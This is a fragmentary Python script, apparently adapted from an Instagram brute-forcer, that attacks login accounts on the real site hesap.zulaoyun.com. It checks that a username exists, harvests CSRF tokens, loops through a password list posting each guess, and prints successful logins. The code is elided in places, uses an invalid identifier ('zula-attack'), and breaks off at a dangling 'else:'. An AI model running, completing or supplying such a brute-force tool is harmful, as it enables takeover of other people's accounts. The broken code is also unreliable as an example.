...
class Instabrute():
	...
	#Check if username exists in zula server
	def IsUserExists(self):
		r = requests.get('https://hesap.zulaoyun.com/%s/?__a=1' % self.username) 
	...
	def Login(self, password):
		...
		sess.headers.update({
			...
			'authority': 'www.hesap.zulaoyun.com',
			'Host' : 'www.hesap.zulaoyun.com',
			'Accept-Language' : 'en-US;q=0.6,en;q=0.4',
			'Accept-Encoding' : 'gzip, deflate'
		})

		#Update token after enter to the site
		r = sess.get('https://hesap.zulaoyun.com/') 
		sess.headers.update({'X-CSRFToken' : r.cookies.get_dict()['csrftoken']})

		#Update token after login to the site 
		r = sess.post('https://hesap.zulaoyun.com/', data={'username':self.username, 'password':password}, allow_redirects=True)
		sess.headers.update({'X-CSRFToken' : r.cookies.get_dict()['csrftoken']})
...
for password in zula-attack.passwords:
	sess = zula-attack.Login(password)
	if sess:
		print ('[*] Login success %s' % [zula-attack.username,password])
	else:
